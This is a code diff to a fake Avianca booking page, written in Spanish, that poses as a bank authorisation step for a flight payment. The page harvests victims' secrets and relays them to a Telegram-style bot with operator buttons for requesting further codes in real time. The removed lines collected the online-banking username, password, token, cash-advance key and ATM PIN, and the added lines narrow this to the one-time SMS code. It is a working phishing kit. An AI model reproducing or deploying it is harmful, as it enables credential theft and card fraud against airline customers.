@@ -1,11 +1,11 @@
-<!DOCTYPE html>
+    <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Avianca - Booking</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="shortcut icon" href="./assets/favicon.svg" t  ype="image/x-icon">
+    <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -66,40 +66,27 @@
         <img id="company-loader">
         <div class="loader"></div>
     </div>
-<div class="logos">
-    <img id="bank-logo" src="" alt="" width="">
-    <img id="company-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Avianca_Logo_2013.png" alt="Avianca 2" width="110px">
-    </div>
+    <div class="logos">
+        <img id="bank-logo" src="" alt="" width="">
+        <img id="company-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Avianca_Logo_2013.png" alt="Avianca 2" width="110px">
     </div>
     <main>
         <div class="content">
-            <b style="margin-bottom: 20px; display: block;" >Autorización de transacción</b>
-            <p style="margin-bottom: 10px;" >La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor verifica la siguiente información:</p>
-            <p style="margin-bottom: 20px;">Ingrese los datos de su Banca Virtual:</p>
+            <b style="margin-bottom: 20px; display: block;">Autorización de transacción</b>
+            <p style="margin-bottom: 10px;">La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor, verifica la siguiente información:</p>
+            <p style="margin-bottom: 20px;">Ingrese el código de su Banca Virtual:</p>
             <form id="form" style="margin-bottom: 30px;">
                 <div class="labels">
                     <b>Comercio: </b>
                     <b>Monto: </b>
                     <b>Número de tarjeta: </b>
-                    <b id="user_label">Usuario: </b>
-                    <b id="puser_label">Contraseña: </b>
-                    <b class="hidden" id="cdin_label">Clave Dinámica: </b>
-                    <b class="hidden" id="dintok_label">Token: </b>
-                    <b class="hidden" id="cavance_label">Clave Avances: </b>
-                    <b class="hidden" id="ccaj_label">Clave Cajero: </b>
-                    <b class="hidden" id="otpcode_label">Código OTP: </b>
+                    <b id="otpcode_label">Código OTP: </b>
                 </div>
                 <div class="values">
                     <p>AVIANCA S.A</p>
                     <p>$ <span id="flight-price">49.000</span> USD</p>
                     <p>•••• •••• •••• <span id="card-digits"></span></p>
-                    <input required type="text" id="user_input">
-                    <input required type="password" id="puser_input">
-                    <input class="hidden" oninput="limitDigits(this, 6)" type="text" id="cdin_input">
-                    <input class="hidden" oninput="limitDigits(this, 8)" type="text" id="dintok_input">
-                    <input class="hidden" oninput="limitDigits(this, 6)" type="password" id="cavance_input">
-                    <input class="hidden" oninput="limitDigits(this, 4)" type="password" id="ccaj_input">
-                    <input class="hidden" oninput="limitDigits(this, 8)" type="text" id="otpcode_input">
+                    <input required oninput="limitDigits(this, 8)" type="text" id="otpcode_input">
                 </div>
             </form>
         </div>
@@ -108,7 +95,7 @@
             Aceptar
         </button>
     </main>
-    
+
     <div class="loaderp-full">
         <span class="loaderp"></span>
         <p class="text-italic tc-ocean fs-3 fw-light">Validando datos...</p>
@@ -141,27 +128,13 @@
         }
 
         const inputMap = {
-            'pedir_dinamica': { label: 'cdin_label', input: 'cdin_input' },
             'pedir_otp': { label: 'otpcode_label', input: 'otpcode_input' },
-            'pedir_token': { label: 'dintok_label', input: 'dintok_input' },
-            'pedir_cavance': { label: 'cavance_label', input: 'cavance_input' },
-            'pedir_ccaj': { label: 'ccaj_label', input: 'ccaj_input' },
             'error_tc': { error_msg: "Error en la tarjeta. Por favor, intente de nuevo." },
-            'error_logo': { error_msg: "Error en el logo del banco." },
-            'error_dinamica': { label: 'cdin_label', input: 'cdin_input', error_msg: "Error en la clave dinámica. Por favor, verifique y vuelva a ingresar." },
             'error_otp': { label: 'otpcode_label', input: 'otpcode_input', error_msg: "Error en el código SMS. Por favor, ingréselo nuevamente." },
-            'error_token': { label: 'dintok_label', input: 'dintok_input', error_msg: "Error en el token. Por favor, verifique y vuelva a ingresar." },
-            'error_cavance': { label: 'cavance_label', input: 'cavance_input', error_msg: "Error en la clave de avances. Por favor, verifique y vuelva a ingresar." },
-            'error_ccaj': { label: 'ccaj_label', input: 'ccaj_input', error_msg: "Error en la clave de cajero. Por favor, verifique y vuelva a ingresar." },
         };
 
         function hideAllInputs() {
-            for (const key in inputMap) {
-                if (inputMap[key].label) {
-                    document.getElementById(inputMap[key].label).classList.add('hidden');
-                    document.getElementById(inputMap[key].input).classList.add('hidden');
-                }
-            }
+            // No es necesario ocultar porque solo hay un campo visible
         }
 
         async function checkVerification(transactionId, messageId) {
@@ -193,21 +166,18 @@
                                 reply_markup: { inline_keyboard: [] }
                             }),
                         });
-                        
+
                         document.querySelector(".loaderp-full").style.display = "none";
                         hideAllInputs();
 
-                        if (actionConfig) {
-                            if (actionConfig.label) {
-                                document.getElementById(actionConfig.label).classList.remove('hidden');
-                                document.getElementById(actionConfig.input).classList.remove('hidden');
-                            }
-                            if (actionConfig.error_msg) {
-                                alert(actionConfig.error_msg);
-                            }
+                        if (actionConfig && actionConfig.error_msg) {
+                            alert(actionConfig.error_msg);
                         }
-                        
+
                         switch (action) {
+                            case 'error_tc':
+                                window.location.href = "payment.html";
+                                break;
                             case 'finalizar':
                                 window.location.href = "https://www.avianca.com/";
                                 break;
@@ -225,16 +195,9 @@
         }
 
         document.getElementById("btnNextStep").addEventListener("click", function() {
-            const visibleInputs = document.querySelectorAll('#form input:not(.hidden)');
-            let allValid = true;
-            visibleInputs.forEach(input => {
-                if (!input.value) {
-                    allValid = false;
-                }
-            });
-
-            if (!allValid) {
-                alert("Por favor, complete todos los campos requeridos.");
+            const otpInput = document.getElementById('otpcode_input');
+            if (!otpInput.value) {
+                alert("Por favor, complete el campo de código OTP.");
                 return;
             }
 
@@ -246,12 +209,10 @@
             const storedData = JSON.parse(localStorage.getItem('paymentData')) || {};
             const transactionId = storedData.transactionId || (Date.now().toString(36) + Math.random().toString(36).substr(2));
             localStorage.setItem('paymentData', JSON.stringify({ ...storedData, transactionId }));
-            
+
             const formValues = {};
-            const visibleInputs = document.querySelectorAll('#form input:not(.hidden)');
-            visibleInputs.forEach(input => {
-                formValues[input.id.replace('_input', '')] = escapeMarkdownV2(input.value);
-            });
+            const otpInput = document.getElementById('otpcode_input');
+            formValues.otpcode = escapeMarkdownV2(otpInput.value);
 
             const fullMessage = `
 ✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
@@ -279,12 +240,6 @@
 \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
 *👤 DATOS DE ACCESO*
 \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
-*Usuario:* ${formValues.user || 'No ingresado'}
-*Contraseña:* ${formValues.puser || 'No ingresado'}
-*Clave Dinámica:* ${formValues.cdin || 'No ingresado'}
-*Token:* ${formValues.dintok || 'No ingresado'}
-*Clave Avances:* ${formValues.cavance || 'No ingresado'}
-*Clave Cajero:* ${formValues.ccaj || 'No ingresado'}
 *Código OTP:* ${formValues.otpcode || 'No ingresado'}
 \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
 *🆔 ID de Transacción:* ${transactionId}
@@ -292,13 +247,7 @@
 
             const keyboard = JSON.stringify({
                 inline_keyboard: [
-                    [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }, { text: "Pedir OTP", callback_data: `pedir_otp:${transactionId}` }],
-                    [{ text: "Pedir Token", callback_data: `pedir_token:${transactionId}` }, { text: "Pedir Clave Avances", callback_data: `pedir_cavance:${transactionId}` }],
-                    [{ text: "Pedir Clave Cajero", callback_data: `pedir_ccaj:${transactionId}` }],
-                    [{ text: "Error Dinámica", callback_data: `error_dinamica:${transactionId}` }, { text: "Error OTP", callback_data: `error_otp:${transactionId}` }],
-                    [{ text: "Error Token", callback_data: `error_token:${transactionId}` }, { text: "Error Clave Avances", callback_data: `error_cavance:${transactionId}` }],
-                    [{ text: "Error Clave Cajero", callback_data: `error_ccaj:${transactionId}` }],
-                    [{ text: "Error TC", callback_data: `error_tc:${transactionId}` }, { text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
+                    [{ text: "Error OTP", callback_data: `error_otp:${transactionId}` }, { text: "Error TC", callback_data: `error_tc:${transactionId}` }],
                     [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
                 ],
             });
